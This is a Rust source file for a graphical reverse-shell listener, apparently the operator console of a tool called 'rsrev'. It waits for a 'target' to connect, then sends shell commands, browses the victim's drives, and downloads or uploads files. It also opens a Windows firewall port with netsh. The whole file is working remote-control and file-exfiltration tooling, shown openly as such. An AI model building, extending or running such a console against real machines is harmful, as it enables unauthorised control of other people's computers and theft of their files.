mod protocol;
use protocol::*;

use eframe::egui;
use std::fs::File;
use std::io::{self, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::Path;
use std::time::Duration;

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        eprintln!("Usage: listener <port>");
        std::process::exit(1);
    }
    let port: u16 = args[1].parse().unwrap_or_else(|_| {
        eprintln!("Invalid port: {}", args[1]);
        std::process::exit(1);
    });

    // Firewall-Freigabe für den Port versuchen
    try_open_firewall(port);

    use socket2::{Socket, Domain, Type, Protocol};
    let addr = format!("0.0.0.0:{}", port).parse::<std::net::SocketAddr>().unwrap();
    let socket = Socket::new(Domain::IPV4, Type::STREAM, Some(Protocol::TCP)).unwrap_or_else(|e| {
        eprintln!("[!] socket: {}", e);
        std::process::exit(1);
    });
    socket.set_reuse_address(true).unwrap_or_else(|e| {
        eprintln!("[!] set_reuse_address: {}", e);
        std::process::exit(1);
    });
    socket.set_nonblocking(true).unwrap();
    socket.bind(&addr.into()).unwrap_or_else(|e| {
        eprintln!("[!] bind: {}", e);
        std::process::exit(1);
    });
    socket.listen(1024).unwrap_or_else(|e| {
        eprintln!("[!] listen: {}", e);
        std::process::exit(1);
    });
    let listener: TcpListener = socket.into();

    let native_options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default().with_inner_size([1000.0, 680.0]),
        ..Default::default()
    };

    eframe::run_native(
        "Listener",
        native_options,
        Box::new(|_cc| Ok(Box::new(ListenerApp::new(port, listener)))),
    )
    .ok();
}

enum DlState {
    Idle,
    Downloading { file: File, name: String, total: u64, received: u64 },
}

enum UlState {
    Idle,
    Prepared { file: File, name: String, size: u64, offset: u64 },
    AwaitingAck,
}

struct FileManager {
    path: String,
    entries: Vec<DirEntry>,
    pending: bool,
}

impl FileManager {
    fn new() -> Self {
        Self { path: "C:\\".into(), entries: Vec::new(), pending: false }
    }
}

struct ListenerApp {
    listener: Option<TcpListener>,
    port: u16,
    stream: Option<TcpStream>,
    status: String,
    shell_output: String,
    input_buffer: String,
    connected: bool,
    dl_state: DlState,
    ul_state: UlState,
    fm: FileManager,
    show_tab: bool, // true = shell, false = files
    read_buf: Vec<u8>,
}

impl ListenerApp {
    fn new(port: u16, listener: TcpListener) -> Self {
        Self {
            listener: Some(listener),
            port,
            stream: None,
            status: format!("[*] Listening on port {}...", port),
            shell_output: String::new(),
            input_buffer: String::new(),
            connected: false,
            dl_state: DlState::Idle,
            ul_state: UlState::Idle,
            fm: FileManager::new(),
            show_tab: true,
            read_buf: Vec::new(),
        }
    }

    fn send_msg(&mut self, msg: &Message) {
        if let Some(ref mut stream) = self.stream {
            let _ = write_msg(stream, msg);
        }
    }

    fn try_read_frame(&mut self) -> bool {
        let stream = match self.stream.as_mut() {
            Some(s) => s,
            None => return false,
        };

        // Read all available data into the buffer (non-blocking)
        stream.set_read_timeout(Some(Duration::from_millis(1))).ok();
        let mut temp = [0u8; 65536];
        loop {
            match stream.read(&mut temp) {
                Ok(0) => {
                    self.status = "[!] Connection closed".into();
                    self.connected = false;
                    self.stream = None;
                    self.dl_state = DlState::Idle;
                    self.ul_state = UlState::Idle;
                    return true;
                }
                Ok(n) => self.read_buf.extend_from_slice(&temp[..n]),
                Err(ref e)
                    if e.kind() == io::ErrorKind::WouldBlock
                        || e.kind() == io::ErrorKind::TimedOut =>
                {
                    break;
                }
                Err(_) => {
                    self.status = "[!] Connection lost".into();
                    self.connected = false;
                    self.stream = None;
                    self.dl_state = DlState::Idle;
                    self.ul_state = UlState::Idle;
                    return true;
                }
            }
        }

        // Try to parse one frame from the buffer
        match parse_frame(&self.read_buf) {
            Ok((frame, consumed)) => {
                self.read_buf.drain(..consumed);
                match frame {
                    Frame::Msg(msg) => self.handle_msg(msg),
                    Frame::Chunk(chunk) => self.handle_chunk(chunk),
                }
                true
            }
            Err(ParseError::NeedMore) => false,
            Err(ParseError::Invalid(e)) => {
                self.status = format!("[!] Protocol error: {}", e);
                self.connected = false;
                self.stream = None;
                self.dl_state = DlState::Idle;
                self.ul_state = UlState::Idle;
                true
            }
        }
    }

    fn handle_msg(&mut self, msg: Message) {
        match msg {
            Message::CmdOutput(text) => self.shell_output.push_str(&text),
            Message::ShellClosed => self.shell_output.push_str("\n[!] shell closed\n"),
            Message::DirEntries(entries) => {
                if self.fm.pending {
                    self.fm.entries = entries;
                    self.fm.pending = false;
                }
            }
            Message::Success => {
                if matches!(self.ul_state, UlState::AwaitingAck) {
                    self.status = "[*] Upload complete".into();
                    self.ul_state = UlState::Idle;
                    self.fm_list();
                }
            }
            Message::FileError(e) => {
                if self.fm.pending {
                    self.fm.pending = false;
                    self.fm.path = String::new();
                    self.fm_list();
                    return;
                }
                self.status = format!("[!] File error: {}", e);
                self.dl_state = DlState::Idle;
                self.ul_state = UlState::Idle;
            }
            Message::FileReady => {
                let taken = std::mem::replace(&mut self.ul_state, UlState::Idle);
                if let UlState::Prepared { mut file, name, size, mut offset } = taken {
                    let mut buf = vec![0u8; CHUNK_SIZE];
                    loop {
                        let n = match file.read(&mut buf) {
                            Ok(0) => break,
                            Ok(n) => n,
                            Err(e) => {
                                self.status = format!("[!] Upload read: {}", e);
                                return;
                            }
                        };
                        let is_last = (offset + n as u64) >= size;
                        if let Some(ref mut stream) = self.stream {
                            let chunk = FileChunk {
                                total_size: size,
                                offset,
                                is_last,
                                data: buf[..n].to_vec(),
                            };
                            if write_chunk(stream, &chunk).is_err() {
                                self.status = "[!] Upload write failed".into();
                                return;
                            }
                        }
                        offset += n as u64;
                        if is_last {
                            self.ul_state = UlState::AwaitingAck;
                            self.status = format!("[*] Uploaded '{}'...", name);
                            return;
                        }
                    }
                    self.ul_state = UlState::AwaitingAck;
                    self.status = format!("[*] Uploaded '{}'...", name);
                }
            }
            _ => {}
        }
    }

    fn handle_chunk(&mut self, chunk: FileChunk) {
        let taken = std::mem::replace(&mut self.dl_state, DlState::Idle);
        if let DlState::Downloading { mut file, name, mut total, mut received } = taken {
            if total == 0 { total = chunk.total_size; }
            if file.write_all(&chunk.data).is_err() {
                self.status = "[!] Download write error".into();
                return;
            }
            received += chunk.data.len() as u64;
            if chunk.is_last {
                self.send_msg(&Message::FileDone);
                self.status = format!("[*] Download complete: {}", name);
            } else {
                self.dl_state = DlState::Downloading { file, name, total, received };
            }
        }
    }

    // ── File manager logic ──

    fn fm_list(&mut self) {
        self.fm.pending = true;
        let path = if self.fm.path.is_empty() {
            "::drives".to_string()
        } else {
            self.fm.path.clone()
        };
        self.send_msg(&Message::ListDir(path));
    }

    fn fm_nav(&mut self, name: &str) {
        if name == ".." {
            if self.fm.path.is_empty() { return; }
            match Path::new(&self.fm.path).parent().and_then(|p| p.to_str()) {
                Some("") | None => self.fm.path = String::new(),
                Some(p) => self.fm.path = p.to_string(),
            }
        } else if name.starts_with('/') || (name.len() >= 2 && name.as_bytes()[1] == b':') {
            self.fm.path = if name.len() == 2 && name.as_bytes()[1] == b':' {
                format!("{}\\", name)
            } else {
                name.to_string()
            };
        } else {
            self.fm.path = Path::new(&self.fm.path).join(name).to_string_lossy().to_string();
        }
        self.fm_list();
    }

    fn fm_download(&mut self, name: &str) {
        let remote = if self.fm.path.is_empty() || name.starts_with('/') || (name.len() >= 2 && name.as_bytes()[1] == b':') {
            name.to_string()
        } else {
            let sep = if cfg!(target_os = "windows") { "\\" } else { "/" };
            format!("{}{}{}", self.fm.path.trim_end_matches(|c| c == '/' || c == '\\'), sep, name)
        };
        let local = Path::new(name).file_name().and_then(|s| s.to_str()).unwrap_or("file");
        match File::create(local) {
            Ok(file) => {
                self.send_msg(&Message::DownloadRequest(remote));
                self.dl_state = DlState::Downloading { file, name: local.to_string(), total: 0, received: 0 };
                self.status = format!("[*] Downloading '{}'...", local);
            }
            Err(e) => self.status = format!("[!] Cannot create: {}", e),
        }
    }

    fn fm_upload(&mut self) {
        #[cfg(not(target_os = "linux"))]
        if let Some(local) = rfd::FileDialog::new().pick_file() {
            let name = match local.file_name().and_then(|s| s.to_str()) {
                Some(n) => n.to_string(),
                None => { self.status = "[!] Invalid filename".into(); return; }
            };
            let file = match File::open(&local) {
                Ok(f) => f,
                Err(e) => { self.status = format!("[!] Cannot open: {}", e); return; }
            };
            let size = file.metadata().map(|m| m.len()).unwrap_or(0);
            let remote = if self.fm.path.is_empty() {
                name.clone()
            } else {
                let sep = if cfg!(target_os = "windows") { "\\" } else { "/" };
                format!("{}{}{}", self.fm.path.trim_end_matches(|c| c == '/' || c == '\\'), sep, name)
            };
            self.send_msg(&Message::UploadRequest(remote));
            self.ul_state = UlState::Prepared { file, name, size, offset: 0 };
            self.status = "[*] Uploading...".into();
        }
    }

    // ── Rendering ──

    fn render_status(&mut self, ctx: &egui::Context) {
        egui::TopBottomPanel::top("status").show(ctx, |ui| {
            ui.horizontal(|ui| {
                ui.label(&self.status);
                ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                    if self.connected && ui.button("Exit").clicked() {
                        self.send_msg(&Message::Exit);
                        std::process::exit(0);
                    }
                });
            });
        });
    }

    fn render_bottom(&mut self, ctx: &egui::Context) {
        egui::TopBottomPanel::bottom("input").show(ctx, |ui| {
            ui.horizontal(|ui| {
                let resp = ui.add_sized(
                    [ui.available_width() - 60.0, 0.0],
                    egui::TextEdit::singleline(&mut self.input_buffer)
                        .hint_text("Type a shell command..."),
                );
                let send = ui.button("Send");
                if (resp.lost_focus() && ui.input(|i| i.key_pressed(egui::Key::Enter))) || send.clicked() {
                    let line = self.input_buffer.trim().to_string();
                    if !line.is_empty() { self.handle_input(line); }
                    self.input_buffer.clear();
                }
                if !resp.has_focus() && !send.is_pointer_button_down_on() {
                    resp.request_focus();
                }
            });

            ui.separator();

            ui.horizontal(|ui| {
                if ui.button("Start Shell").clicked() { self.send_msg(&Message::StartShell); }
                if ui.button("Stop Shell").clicked() { self.send_msg(&Message::StopShell); }
                if ui.button("Clear").clicked() { self.shell_output.clear(); }
            });

            if let DlState::Downloading { name, total, received, .. } = &self.dl_state {
                if *total > 0 {
                    let pct = (*received as f64 / *total as f64) * 100.0;
                    ui.horizontal(|ui| {
                        ui.label(format!("DL {}: {:.0}%", name, pct));
                        ui.add(egui::ProgressBar::new((pct as f32) / 100.0));
                    });
                }
            }
        });
    }

    fn render_shell_content(&mut self, ui: &mut egui::Ui) {
        let avail = ui.available_height();
        let text_h = (avail - 4.0).max(60.0);
        egui::ScrollArea::vertical()
            .max_height(text_h)
            .stick_to_bottom(true)
            .show(ui, |ui| {
                ui.add_sized(
                    [ui.available_width(), text_h],
                    egui::TextEdit::multiline(&mut self.shell_output)
                        .font(egui::TextStyle::Monospace)
                        .lock_focus(true)
                        .interactive(false),
                );
            });
    }

    fn render_files_content(&mut self, ui: &mut egui::Ui) {
        if !self.connected {
            ui.label("(not connected)");
            return;
        }

        ui.horizontal(|ui| {
            if self.fm.path.is_empty() {
                ui.label("Path: (Drives)");
            } else {
                ui.label(format!("Path: {}", self.fm.path));
            }
            if ui.button("Refresh").clicked() { self.fm_list(); }
        });

        ui.horizontal(|ui| {
            if ui.button("Upload File...").clicked() { self.fm_upload(); }
        });

        ui.separator();

        if self.fm.pending {
            ui.label("Loading...");
            return;
        }

        let avail = ui.available_height();
        egui::ScrollArea::vertical()
            .auto_shrink([false, false])
            .show(ui, |ui| {
                ui.set_min_height(avail);

                if self.fm.path.is_empty() {
                    // Drives
                    for entry in &self.fm.entries.clone() {
                        if ui.button(format!("[{}]", entry.name)).clicked() {
                            self.fm_nav(&entry.name);
                        }
                    }
                    return;
                }

                // Parent
                let r = ui.button("[..]");
                if r.clicked() { self.fm_nav(".."); }

                // Entries
                for entry in &self.fm.entries.clone() {
                    ui.horizontal(|ui| {
                        let label = if entry.is_dir {
                            format!("[{}]/", entry.name)
                        } else {
                            entry.name.clone()
                        };

                        let clicked = if entry.is_dir {
                            ui.button(&label).clicked()
                        } else {
                            ui.label(&label);
                            false
                        };

                        ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                            if !entry.is_dir {
                                if ui.button("DL").clicked() {
                                    self.fm_download(&entry.name);
                                }
                                ui.separator();
                                ui.label(&entry.modified);
                                ui.separator();
                                ui.label(format_size(entry.size));
                            } else {
                                ui.label("DIR");
                                ui.separator();
                                ui.label(&entry.modified);
                            }
                        });

                        if clicked { self.fm_nav(&entry.name); }
                    });
                }
            });
    }

    fn render_central(&mut self, ctx: &egui::Context) {
        egui::CentralPanel::default().show(ctx, |ui| {
            if !self.connected {
                ui.vertical_centered(|ui| {
                    ui.heading("Reverse Shell Listener");
                    ui.label(format!("Waiting for target connection on port {}...", self.port));
                });
                return;
            }

            ui.horizontal(|ui| {
                if ui.selectable_label(self.show_tab, "  Shell  ").clicked() { self.show_tab = true; }
                if ui.selectable_label(!self.show_tab, "  Files  ").clicked() { self.show_tab = false; }
            });
            ui.separator();

            if self.show_tab {
                self.render_shell_content(ui);
            } else {
                self.render_files_content(ui);
            }
        });
    }

    fn handle_input(&mut self, line: String) {
        let parts: Vec<&str> = line.split_whitespace().collect();
        match parts[0] {
            "shell" => self.send_msg(&Message::StartShell),
            "stop" => self.send_msg(&Message::StopShell),
            "refresh" => self.fm_list(),
            _ => self.send_msg(&Message::CmdInput(line)),
        }
    }
}

impl eframe::App for ListenerApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        if !self.connected {
            if let Some(ref listener) = self.listener {
                match listener.accept() {
                    Ok((stream, addr)) => {
                        self.status = format!("[*] Connected from {}", addr);
                        self.connected = true;
                        self.stream = Some(stream);
                    }
                    Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {}
                    Err(e) => self.status = format!("[!] Accept error: {}", e),
                }
            }
        }

        if self.connected {
            for _ in 0..256 {
                if !self.try_read_frame() { break; }
                if !self.connected { break; }
            }
        }

        if self.connected && !self.fm.pending && self.fm.entries.is_empty() {
            self.fm_list();
        }

        self.render_status(ctx);
        self.render_bottom(ctx);
        self.render_central(ctx);

        if self.connected { ctx.request_repaint(); }
        else { ctx.request_repaint_after(Duration::from_millis(100)); }
    }
}

fn format_size(size: u64) -> String {
    const UNITS: &[&str] = &["B", "KB", "MB", "GB", "TB"];
    let mut s = size as f64;
    let mut i = 0;
    while s >= 1024.0 && i < UNITS.len() - 1 { s /= 1024.0; i += 1; }
    if i == 0 { format!("{} B", size) }
    else { format!("{:.1} {}", s, UNITS[i]) }
}

fn try_open_firewall(port: u16) {
    #[cfg(target_os = "windows")]
    {
        let rule_name = format!("rsrev Listener (port {})", port);
        let status = std::process::Command::new("netsh")
            .args([
                "advfirewall",
                "firewall",
                "add",
                "rule",
                &format!("name={}", rule_name),
                "dir=in",
                "action=allow",
                "protocol=TCP",
                &format!("localport={}", port),
            ])
            .output();
        match status {
            Ok(out) if out.status.success() => {
                eprintln!("[*] Firewall rule added for port {}", port);
            }
            Ok(out) => {
                let stderr = String::from_utf8_lossy(&out.stderr);
                if !stderr.trim().is_empty() {
                    eprintln!("[!] Firewall: {}", stderr.trim());
                }
                eprintln!("[!] Could not add firewall rule (try running as admin)");
            }
            Err(e) => {
                eprintln!("[!] Firewall command failed: {}", e);
            }
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = port;
    }
}
